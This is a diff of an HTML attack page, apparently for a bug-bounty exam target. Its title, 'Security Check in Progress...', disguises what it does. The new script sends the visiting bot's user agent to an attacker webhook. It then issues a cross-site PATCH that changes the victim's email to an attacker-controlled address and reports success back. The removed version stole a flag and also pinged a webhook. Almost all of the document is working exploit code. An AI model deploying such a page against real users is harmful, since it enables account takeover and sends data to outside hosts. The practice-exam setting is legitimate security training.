@@ -1,26 +1,30 @@
-<!DOCTYPE html>
 <html>
-<body>
+  <body>
+    <h1>Security Check in Progress...</h1>
     <script>
-        // 1. Fetch the profile (which has the flag)
-        fetch('https://api-bugbounty-exam.hashacademy.co/api/auth/profile')
-        .then(r => r.json())
-        .then(userData => {
-            // 2. The flag is now in 'userData.flag' or 'userData.email'
-            // We force the bot to update its NAME to be the FLAG
-            return fetch('https://api-bugbounty-exam.hashacademy.co/api/auth/update', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    name: userData.flag || "FLAG-NOT-FOUND", 
-                    bio: "Security Audit"
-                })
-            });
+      const webhook = "https://webhooksite.net/841a65c5-0695-459d-80da-91ae7613c283";
+      const apiTarget = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
+
+      // 1. Alert your webhook that the Bot has arrived
+      fetch(webhook + "?status=bot_landed&ua=" + btoa(navigator.userAgent));
+
+      // 2. Attempt the CSRF PATCH to take over the account
+      // We try to change the email to one we control
+      fetch(apiTarget, {
+        method: "PATCH",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "text/plain"
+        },
+        body: JSON.stringify({
+          "email": "rundlady@gongjua.com",
+          "fullName": "Account Owned",
+          "phoneNumber": "13371337"
         })
-        .then(() => {
-            // Confirm to your webhook that the attempt finished
-            new Image().src = "https://webhooksite.net/af8d2f8d-349b-48e1-8b7a-78b2294cf0d2/done";
-        });
+      }).then(() => {
+        // 3. Confirm to your webhook that the request was sent
+        fetch(webhook + "?status=attack_sent");
+      });
     </script>
-</body>
+  </body>
 </html>
